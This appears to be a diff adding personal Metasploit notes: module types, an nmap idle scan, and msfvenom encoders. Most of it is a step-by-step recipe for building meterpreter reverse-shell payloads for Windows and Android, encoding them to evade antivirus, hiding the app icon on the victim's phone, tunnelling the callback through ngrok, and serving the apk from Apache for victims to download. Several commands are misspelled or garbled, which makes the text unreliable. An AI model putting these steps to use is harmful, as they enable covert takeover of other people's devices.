@@ -1,0 +1,242 @@
+
+
+ METASPLOIT MODULES
+
+=> Exploit
+ -> An exploits executes a sequence of commands that target a specific vunerability founds in a system.
+
+=> Auxiliary
+ -> Auxiliary modules includes ports scanners , fuzzers , sniffers , dos and many mores.
+
+=> Payloads
+ -. Payloads consist of code that runs remotely.
+
+=> Encoders
+ -> Encoders ensure that payloads make it to their destination intact.
+
+=> Nops 
+ -> Nops keep the payload size consistent across exploits attempts.
+
+=> Evasion
+ ->these new modules are designed to help you creat payloads that can evade anti-virus (AV) on the target system.
+
+=> Post
+ -> Post-exploitation modules that can be on compromised targets to gather evidences, pivot deeperinto a target network, and much more.
+
+ MSFCONSOLE
+=> The msfconsole is the most popular interface to the Metasploit frames (MSF).
+=> Excution of external commands in msfconsole is possible.
+
+-----------------------------------------------
+
+Postgre sql store over data base
+
+
+$ service postgresql start
+$ service postgresql status
+
+-------------------------------------------
+zombie system
+
+
+#metasploit
+search ipidseq
+use 0
+show options
+set RHOST (giving ip range) 192.168.78.0-192.168.78.255
+show options
+run
+nmap --scrip=ipidseq -v -iR 1000(scan random host automatic) -p 80
+nmap -Pn(no ping scan)-p 1-65535 -sI 192.168.72.2[metasploit ip / nmap find ip] 192.168.78.129[victim ip]
+wireshark to check pack
+
+-----------------------------------------------
+                                                           msfvenom 
+
+# msfvenom have payloads, encoders, nops, platforms, archs, encrypt, formats .
+# we can check by using 
+$ msfvenom --list encoders it will show u all
+
+
+
+
+Framework Encoders [--encoder <value>]
+======================================
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/brace                     low        Bash Brace Expansion Command Encoder
+    cmd/echo                      good       Echo Command Encoder
+    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
+    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
+    cmd/perl                      normal     Perl Command Encoder
+    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
+    generic/eicar                 manual     The EICAR Encoder
+    generic/none                  normal     The "none" Encoder
+    mipsbe/byte_xori              normal     Byte XORi Encoder
+    mipsbe/longxor                normal     XOR Encoder
+    mipsle/byte_xori              normal     Byte XORi Encoder
+    mipsle/longxor                normal     XOR Encoder
+    php/base64                    great      PHP Base64 Encoder
+    ppc/longxor                   normal     PPC LongXOR Encoder
+    ppc/longxor_tag               normal     PPC LongXOR Encoder
+    ruby/base64                   great      Ruby Base64 Encoder
+    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
+    x64/xor                       normal     XOR Encoder
+    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
+    x64/xor_dynamic               normal     Dynamic key XOR Encoder
+    x64/zutto_dekiru              manual     Zutto Dekiru
+    x86/add_sub                   manual     Add/Sub Encoder
+    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
+    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
+    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
+    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
+    x86/bmp_polyglot              manual     BMP Polyglot
+    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
+    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
+    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
+    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
+    x86/countdown                 normal     Single-byte XOR Countdown Encoder
+    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
+    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
+    x86/nonalpha                  low        Non-Alpha Encoder
+    x86/nonupper                  low        Non-Upper Encoder
+    x86/opt_sub                   manual     Sub Encoder (optimised)
+    x86/service                   manual     Register Service
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    x86/single_static_bit         manual     Single Static Bit
+    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
+    x86/xor_dynamic               normal     Dynamic key XOR Encoder
+    x86/xor_poly                  normal     XOR POLY Encoder
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+                                                                 ********************************
+                                                                 * Creating payload for Windows *
+                                                                 ********************************
+
+# msfvenom -p <payload type> -a <x64/x86> -e <ecoders>  LHOST=  LPORT=   -f <formate type exe > R > Name.exe
+# msfvenom -p <payload type> -a <x64/x86> -e <ecoders>  LHOST=  LPORT=   -f <formate type exe > -o Name.exe  
+
+# msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -e cmd/powershell_base64 LHOST=192.168.1.8 LPORT=4444 -f exe R > meow.exe 
+  
+
+                                                                 ********************************
+                                                                 * Creating payload for Android *
+                                                                 ******************************** 
+
+# msfvenom -p <payload type> -a <x64/x86> -e <ecoders>  LHOST=  LPORT=   -f <formate type apk > -o Name.exe  
+# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=4444  -a dalvik -o /home/death/droid.apk  
+
+                               
+                                                     ***** to start exploiting *****
+
+# sudo msfconsole 
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    debug         Display information useful for debugging
+    exit          Exit the console
+    features      Display the list of not yet released features that can be opted in to
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    tips          Show a list of useful productivity tips
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+
+for changing banner
+#banner [and just press enter]
+
+without banner
+# msfconsole -q [quite mode]
+
+# show exploits [ to check things]
+
+search exploit 
+# seacrh name
+
+for changing banner
+#banner [and just press enter]
+
+without banner
+# msfconsole -q [quite mode]
+
+# show exploits [ to check things]
+
+set payload 
+# set payload windows/x64/meterpreter/reverse_tcp
+
+use exploit
+# use exploit/multi/handler
+or
+# use 5
+
+run
+# exploit / run
+
+
+
+
+
+meterpreter session command 
+- sysinfo  (get info)
+- hide_app_icon  (--to hide app--)
+
+
+
+
+
+
+
+*******port forword using ngrok***************
+ngrok https for payload
+
+
+./ngrok tcp 1234
+
+forwording    tcp://0.tcp.ngrok.io:17984 -> localhost=1234
+write
+host "add forwording tcp link" like we get address
+host 0.tcp.ngrok.io
+
+now creat payload   
+
+msfvenom -p and./metre/reverse_tcp LHOST="IP U GET BY TYPING HOST" LPORT="17984 U GET AT TCP"
+
+
+service start apache2
+cp payload.apk /var/www/html/  
+
+
+msfconsole
+use multi
+lhost 0.0.0.0
+set lport 1234
